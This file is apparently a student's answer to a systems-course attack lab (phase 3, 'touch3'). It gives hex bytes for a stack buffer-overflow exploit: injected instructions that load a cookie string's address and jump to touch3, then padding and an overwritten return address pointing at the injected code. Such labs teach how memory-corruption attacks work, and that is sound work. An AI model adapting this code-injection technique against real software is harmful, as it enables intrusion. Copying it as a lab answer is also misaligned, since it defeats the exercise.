   48 89 e7             	/* mov    %rsp, %rdi  # set the first argument to the address of string */
   68 fa 18 40 00       	/* pushq  $0x4018fa   # set the return address to touch3 */
   c3
   00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00    /* the address of injection code */
   35 39 62 39 39 37 66 61 00    /* the cookie string */
